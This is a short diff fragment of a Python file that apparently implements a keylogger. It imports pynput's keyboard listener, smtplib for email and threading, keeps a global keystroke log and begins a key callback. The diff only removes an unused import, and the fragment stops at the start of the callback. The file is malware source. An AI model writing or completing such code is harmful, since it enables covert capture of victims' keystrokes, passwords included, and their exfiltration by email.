@@ -1,7 +1,7 @@
 from pynput import keyboard
 import smtplib
 import threading
-import optparse
+
 log=""
 def callback(key):
     global log
